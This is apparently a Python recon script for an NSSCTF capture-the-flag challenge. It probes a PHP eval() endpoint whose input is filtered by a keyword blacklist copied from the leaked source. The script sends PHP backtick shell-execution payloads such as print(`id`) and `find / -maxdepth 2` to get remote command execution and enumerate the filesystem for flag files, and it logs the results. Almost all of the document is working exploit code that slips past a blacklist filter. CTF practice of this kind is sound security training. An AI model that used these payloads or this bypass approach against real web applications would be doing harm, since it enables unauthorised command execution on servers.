#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Lane A recon for NSSCTF node4.anna.nssctf.cn:24112
Goal: confirm the eval() sink markers, prove the backtick shell channel,
      enumerate / and dump every flag-shaped candidate path with lengths.

Usage:
    python solve-recon.py            # full run (writes listing.txt)
    python solve-recon.py id pwd     # run only named probes
"""
import re
import sys
import urllib.request
import urllib.parse
import urllib.error
import os
import json

BASE = "http://node4.anna.nssctf.cn:24112/"
HERE = os.path.dirname(os.path.abspath(__file__))

# ---- exact blacklist from the leaked source -------------------------------
REGEX = r"sys|pas|read|file|ls|cat|tac|head|tail|more|less|php|base|echo|cp|\$|\*|\+|\^|scan|\.|local|current|chr|crypt|show_source|high|readgzfile|dirname|time|next|all|hex2bin|im|shell"
RX = re.compile(REGEX, re.I)

OK_MARK = "看看你输入的参数！！！不叫样子！！"
BLOCK_MARK = "你想干什么？？？？？？？？？"
NOPARAM_MARK = "居然都不输入参数，可恶!!!!!!!!!"


def local_replay(code):
    """Replay the PHP preg_match locally against the URL-DECODED payload."""
    m = RX.search(code)
    return None if m is None else m.group(0)


def request(code, timeout=40):
    """Send ?code=<code>; return (decoded_code, url, status, headers, body)."""
    hit = local_replay(code)
    if hit is not None:
        return dict(code=code, url=None, status=None, headers=None,
                    body=None, blocked_locally=hit)
    qs = urllib.parse.urlencode({"code": code}, quote_via=urllib.parse.quote, safe="")
    url = BASE + "?" + qs
    req = urllib.request.Request(url, headers={"User-Agent": "ctf-recon/1.0"})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            body = r.read().decode("utf-8", "replace")
            return dict(code=code, url=url, status=r.status,
                        headers=dict(r.headers), body=body,
                        blocked_locally=None)
    except urllib.error.HTTPError as e:
        return dict(code=code, url=url, status=e.code, headers=dict(e.headers),
                    body=e.read().decode("utf-8", "replace"),
                    blocked_locally=None)
    except Exception as e:  # noqa: BLE001
        return dict(code=code, url=url, status="ERR", headers=None,
                    body="EXC: %r" % (e,), blocked_locally=None)


def extract(res):
    """Split the response into marker status + payload output."""
    b = res.get("body")
    if b is None:
        return dict(marker="BLOCKED-LOCALLY(%s)" % res["blocked_locally"], out="")
    if BLOCK_MARK in b:
        return dict(marker="BLOCKED-BY-SERVER", out="")
    if OK_MARK in b:
        out = b.split(OK_MARK, 1)[1]
        if out.startswith("<br>"):
            out = out[4:]
        elif out.startswith("<br />"):
            out = out[6:]
        return dict(marker="EVAL-OK", out=out)
    if NOPARAM_MARK in b:
        return dict(marker="NO-PARAM(source leak)", out=b)
    return dict(marker="UNKNOWN", out=b)


# ---- probes ---------------------------------------------------------------
PROBES = [
    ("id",         "print(`id`);"),
    ("pwd",        "print(`pwd`);"),
    ("dirroot",    "print(`dir /`);"),
    ("findroot",   "print(`find / -maxdepth 2`);"),
    ("uname",      "print(`uname -a`);"),
]

# control probes (deliberately banned / benign) to re-verify the blacklist
CONTROLS = [
    ("benign",     "print(1);"),
    ("banned_plus", "print(1+1);"),
    ("banned_dot", "print(1);print(2);print(3);"),
]


def main():
    want = sys.argv[1:]
    lines = []
    results = {}

    print("=" * 78)
    print("TARGET:", BASE)
    print("=" * 78)

    todo = PROBES if not want else [p for p in PROBES if p[0] in want]
    for name, code in todo:
        res = request(code)
        ex = extract(res)
        results[name] = dict(code=code, url=res["url"], marker=ex["marker"],
                             out=ex["out"])
        print("\n--- probe %-10s payload=%r" % (name, code))
        print("    URL    :", res["url"])
        if res["headers"]:
            print("    Server :", res["headers"].get("Server"))
        print("    marker :", ex["marker"])
        print("    output :")
        for ln in (ex["out"] or "").splitlines():
            print("      |", ln)
        lines.append("### probe %s\npayload: %s\nurl: %s\nmarker: %s\noutput:\n%s\n"
                     % (name, code, res["url"], ex["marker"], ex["out"]))

    if not want:
        for name, code in CONTROLS:
            res = request(code)
            ex = extract(res)
            results["ctrl_" + name] = dict(code=code, url=res["url"],
                                           marker=ex["marker"], out=ex["out"])
            print("\n--- control %-12s payload=%r -> %s" % (name, code, ex["marker"]))

    with open(os.path.join(HERE, "listing.txt"), "w", encoding="utf-8") as f:
        f.write("\n".join(lines))
    with open(os.path.join(HERE, "recon-raw.json"), "w", encoding="utf-8") as f:
        json.dump(results, f, ensure_ascii=False, indent=1)
    print("\n[+] wrote listing.txt and recon-raw.json")


if __name__ == "__main__":
    main()
